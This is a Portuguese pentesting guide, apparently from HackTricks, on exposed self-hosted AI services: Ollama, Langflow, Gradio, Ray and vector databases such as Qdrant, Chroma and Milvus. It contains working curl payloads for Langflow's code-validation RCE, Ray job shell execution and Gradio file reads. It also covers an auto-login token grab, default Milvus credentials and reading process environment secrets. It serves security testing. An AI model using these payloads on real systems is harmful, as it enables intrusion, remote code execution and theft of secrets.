# Serviços de IA auto-hospedados expostos

{{#include ../banners/hacktricks-training.md}}

Equipes que desenvolvem recursos de IA costumam executar seus próprios executores de modelos, construtores de agentes, UIs de demonstração, clusters de computação e bancos de dados vetoriais. Muitas dessas ferramentas foram projetadas para um laptop ou uma rede de laboratório fechada, então **não têm autenticação por padrão** ou vêm com um atalho de autenticação habilitado. Quando um serviço desse tipo está acessível ao invasor, o impacto geralmente se enquadra em um destes grupos:

- Uso gratuito de GPUs e modelos, e roubo de modelos privados.
- Leak de prompts, documentos e embeddings.
- Leak de segredos do ambiente do processo (chaves de provedores de LLM, credenciais de cloud).
- Execução de código, porque algumas dessas APIs executam código **como um recurso**.

Esta página descreve como encontrar esses serviços e o que testar em cada tipo de API. Para proteger um servidor de inferência auto-hospedado e o leak de `/slots` do llama.cpp, consulte [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Para arquivos de modelos maliciosos, consulte [AI Models RCE](AI-Models-RCE.md).

## Impressão digital

Envie estas solicitações sem credenciais. Uma resposta JSON com os campos esperados identifica o produto e, muitas vezes, a versão, indicando quais das verificações abaixo se aplicam. As portas são as padrão documentadas ou as usadas nos exemplos oficiais de execução.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Produto | Porta comum | Solicitação sem autenticação | O que o identifica |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON da versão, lista de modelos locais |
| Langflow | 7860 | `GET /api/v1/version` | JSON da versão do Langflow |
| Gradio | 7860 | `GET /config` | Configuração do app com a versão do Gradio e IDs dos componentes |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, lista de jobs enviados |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Valor do heartbeat, versão do Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Versão do Qdrant, lista de coleções |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Versão do Weaviate, classes |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Lista de coleções ou erro de autenticação |

Esses serviços também costumam ser publicados atrás de um proxy reverso sob um prefixo de caminho (por exemplo, `/ollama/` ou `/ray/`), então repita as solicitações usando qualquer prefixo encontrado em bundles JavaScript ou na documentação da API.

## APIs de inferência e gerenciamento de modelos sem autenticação

Os executores de modelos geralmente expõem uma única API REST que combina rotas de inferência com rotas administrativas. Ollama é um bom exemplo. Ele não tem autenticação integrada e, por padrão, faz bind em `127.0.0.1:11434`, enquanto `OLLAMA_HOST` altera o endereço de bind.<sup>[[1]](#references)[[15]](#references)</sup> A imagem Docker oficial define `OLLAMA_HOST=0.0.0.0:11434` dentro do container, declara `EXPOSE 11434` e não tem uma instrução `USER`, então o servidor é executado como root no container.<sup>[[16]](#references)</sup> `EXPOSE` não publica a porta no host, então a acessibilidade pelo host depende da implantação. Os comandos documentados de `docker run` usam `-p 11434:11434`, e o Docker publica esse tipo de mapeamento em todas as interfaces do host, a menos que seja especificado um IP do host.<sup>[[17]](#references)[[18]](#references)</sup>

O que cada grupo de rotas oferece a um invasor:<sup>[[2]](#references)</sup>

| Rotas | Impacto quando não há autenticação |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Lista de modelos locais e carregados, incluindo modelos personalizados privados |
| `POST /api/show` | Detalhes do modelo, incluindo o Modelfile, o template e o **prompt de sistema** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Inferência gratuita no hardware da vítima |
| `POST /api/pull`, `POST /api/push` | Fazer o servidor baixar de um registro escolhido pelo invasor ou enviar um modelo para ele |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Criar, sobrescrever ou excluir modelos |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Uma lista de modelos retornada sem credenciais já comprova a exposição. Modelos personalizados geralmente incluem um system prompt interno em `/api/show`. Um pull direcionado ao seu host comprova que o servidor busca manifests em registries escolhidos pelo atacante. Um `/api/push` direcionado ao seu registry transforma a exposição em roubo de modelos. Não chame rotas de criação ou exclusão em alvos reais.

Os pulls de registries também são uma superfície de ataque ao parser, pois o servidor armazena blobs usando valores do manifest remoto. No Probllama (CVE-2024-37032, corrigido no Ollama 0.1.34), o `digest` do manifest era usado como nome de arquivo sem validação. Assim, um registry malicioso podia gravar arquivos fora do diretório de blobs usando sequências `../`. O envio de um manifest preparado cujo digest apontava para um arquivo local vazou esse arquivo para o registry do atacante. A Wiz obteve RCE no Docker, onde o servidor é executado como root, gravando uma biblioteca compartilhada e adicionando-a a `/etc/ld.so.preload`; em seguida, chamou `/api/chat` para que um novo processo a carregasse.<sup>[[15]](#references)</sup> Quando um runner pode fazer pull de registries arbitrários, verifique como ele transforma os campos do manifest em caminhos.

## APIs que executam código por design

### APIs de envio de jobs

Frameworks de computação distribuída tratam a execução de código como seu principal recurso. A Ray Jobs API na porta do dashboard (8265) aceita um comando shell `entrypoint` e o executa no cluster.<sup>[[19]](#references)</sup> A pesquisa Oligo ShadowRay informa que a Jobs API não tem autorização e que o dashboard faz bind em `0.0.0.0`. A CVE-2023-48022 correspondente é contestada porque o Ray deve ser executado apenas em uma rede controlada.<sup>[[20]](#references)</sup> O Ray adicionou autenticação opcional por token (`RAY_AUTH_MODE=token`) na versão 2.52.0. O Ray 2.59 a habilita por padrão em clusters locais iniciados com `ray.init()`; `ray start --head` ainda pode iniciar sem autenticação quando não há um token disponível. O Ray documenta uma implementação mais ampla da autenticação padrão para a versão 2.61; portanto, confira a versão implantada e o modo de inicialização em vez de presumir que o dashboard está aberto.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashboards desse tipo também têm rotas auxiliares que vale a pena testar em versões antigas. Antes do Ray 2.8.1, `/log_proxy?url=` buscava qualquer URL HTTP(S) (SSRF para metadados da cloud) e `/api/v0/logs/file` aceitava um caminho `filename` arbitrário, ambos sem autenticação.<sup>[[8]](#references)</sup>

### Endpoints de "validação" de código que executam definições de funções

Construtores de agentes que aceitam componentes Python personalizados às vezes "validam" o código analisando-o com `ast` e executando apenas as definições de funções com `exec()`. Isso não é seguro. Python avalia **decorators e valores padrão de argumentos ao definir a função**, então o código colocado nesses locais é executado mesmo que o corpo da função nunca seja executado. O `POST /api/v1/validate/code` do Langflow funcionava dessa forma e não exigia autenticação antes da versão 1.3.0 (CVE-2025-3248). Lançar uma exceção que contenha a saída do comando faz o endpoint retornar essa saída na resposta:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Teste qualquer endpoint que compile, faça lint ou "verifique" código fornecido pelo usuário em busca desse padrão e prefira um callback DNS como prova.

### Rotas de login automático e token de superusuário padrão

Ferramentas para um único usuário geralmente incluem um atalho que faz login de cada visitante como administrador. No Langflow, quando `AUTO_LOGIN` está ativado, `GET /api/v1/auto_login` retorna tokens do superusuário padrão a qualquer chamador. Quando está desativado, a rota responde `Auto login is disabled.`.<sup>[[23]](#references)</sup> O Langflow OSS 1.0.0 a 1.10.0 o ativava por padrão (CVE-2026-9103). Encadeá-lo com a rota autenticada de validação de código acima restaura o RCE não autenticado (CVE-2026-9198, reportado por Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Os pacotes oficiais da versão atual e as imagens Docker desativam o login automático e exigem uma senha de superusuário, mas os branches de desenvolvimento o mantêm ativado.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Mesmo sem execução de código, um token de superusuário dá acesso a todos os fluxos e às credenciais de provider armazenadas. Para uma verificação de pré-requisito relacionada em testes automatizados, consulte [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Rotas de serving de arquivos e RPC em UIs de demonstração de ML

Frameworks de demonstração de ML servem arquivos enviados e gerados por meio de uma rota genérica e permitem que o frontend chame helpers de componentes no servidor. O Gradio expõe `/config`, `/upload` e `/file=<path>` para isso.<sup>[[5]](#references)</sup> Vale testar dois padrões em qualquer framework semelhante:

- **Traversal a partir de um subdiretório de upload:** se a rota de arquivos apenas verificar se o caminho começa dentro da pasta temporária, envie um arquivo para criar um subdiretório e, em seguida, suba na hierarquia com `../` ou `%2e%2e%2f`. O Gradio 4.0 a 4.10 (CVE-2023-51449) era vulnerável dessa forma.<sup>[[26]](#references)[[27]](#references)</sup> Envie a requisição com `curl --path-as-is` para que o cliente não normalize o caminho.
- **Despacho arbitrário de métodos:** um endpoint que chama `getattr(component, fn_name)` com entrada do usuário permite que o atacante chame helpers internos. Antes da versão 4.13.0, o `/component_server` do Gradio fazia isso. Nas versões 4.3 a 4.12, `move_resource_to_block_cache` copiava qualquer arquivo local para o cache, de onde `/file=` podia baixá-lo. Nas versões 3.47 a 3.50.2, outros helpers permitiam leitura de arquivos e SSRF com leitura completa.<sup>[[26]](#references)[[28]](#references)</sup> Um servidor corrigido responde `Function not found.` para helpers que não estão marcados como funções de servidor.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

No Hugging Face Spaces, os secrets do Space são variáveis de ambiente, então `/proc/self/environ` é o arquivo mais valioso. A Horizon3 o leu com um cabeçalho HTTP `Range`.<sup>[[26]](#references)</sup>

## Bancos de dados vetoriais usados por RAG

O RAG armazena partes dos documentos originais, seus embeddings e metadados em um banco de dados vetorial, e o assistente insere os principais resultados no prompt. Portanto, o acesso de leitura expõe o **texto simples de documentos privados**. O acesso de escrita permite que um atacante insira partes que serão recuperadas posteriormente nos prompts de outros usuários, o que constitui prompt injection indireto persistente (veja [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Para bancos de dados vetoriais auto-hospedados, verifique se a autenticação está configurada ou se o acesso anônimo está habilitado:

- **Qdrant**: instâncias implantadas por conta própria escutam em todas as interfaces sem autenticação. Quando configurada, a chave é enviada no cabeçalho `api-key` ou como `Authorization: Bearer`. Podem existir chaves somente de leitura e por coleção.<sup>[[11]](#references)</sup>
- **Chroma**: a autenticação está desabilitada por padrão. A autenticação por token usa `Authorization` ou `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: quando o acesso anônimo está habilitado, as solicitações sem credenciais são autenticadas como `user: anonymous` e recebem as permissões que esse usuário tiver.<sup>[[30]](#references)</sup>
- **Milvus**: a autenticação fica desativada, a menos que `common.security.authorizationEnabled` seja `true`. Quando está ativada, o usuário padrão `root` tem a senha `Milvus`, e o formato do token é `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Uma resposta contendo dados privados sem credenciais indica exposição. Quando a autenticação estiver habilitada, avalie separadamente qualquer conta padrão cuja configuração não tenha sido alterada:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Verifique se os payloads contêm texto de documentos, identificadores de usuários ou nomes de tenants. Para demonstrar acesso de escrita sem envenenar dados de produção, crie e exclua imediatamente uma coleção vazia com um nome claro, e somente quando o escopo permitir.

A autenticação nesses servidores também pode ocorrer tarde demais. No servidor Python FastAPI do Chroma (da versão 1.0.0 até, pelo menos, a 1.5.8, CVE-2026-45829), a rota de criação de coleções criava a função de embedding fornecida pelo cliente antes da verificação de autenticação. Uma configuração que referenciava um modelo do Hugging Face controlado por um atacante com `trust_remote_code: true` executava o código do atacante mesmo quando a solicitação era rejeitada. O frontend Rust não foi afetado.<sup>[[32]](#references)</sup> Quando uma solicitação inclui configuração de modelo ou plugin, teste-a sem credenciais e observe se ocorre uma busca de saída no repositório do seu modelo.

## References

- [1] [Perguntas frequentes do Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Documentação da API do Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README do Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Código-fonte do Langflow - endpoints da API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Código-fonte do Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Código-fonte do Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Código-fonte do Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, versões 2.6.3 e 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Código-fonte do Chroma - padrões do cliente Python](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Código-fonte do Chroma - rotas do servidor FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Segurança](https://qdrant.tech/documentation/security/)
- [12] [Especificação OpenAPI do Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Especificação OpenAPI do Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Conectar ao servidor Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: vulnerabilidade de execução remota de código no Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile do Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Documentação do Ollama para Docker](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Publicação e exposição de portas](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [API REST de tarefas do Ray](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: primeira campanha de ataque conhecida a atingir workloads de IA, explorada no mundo real](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Autenticação por token do Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Inseguro em qualquer velocidade: abuso de Python Exec para RCE não autenticada no Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Código-fonte do Langflow - roteador de login](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Explorando vulnerabilidades de leitura de arquivos no Gradio para roubar segredos do Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Aviso do Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit de correção do Gradio para `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Autenticação nativa do Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Autenticação](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Autenticar acesso de usuários](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast servido antes da autenticação](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Boletim de segurança da IBM - Execução remota de código não autenticada por meio de bypass de login automático e validação de código (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
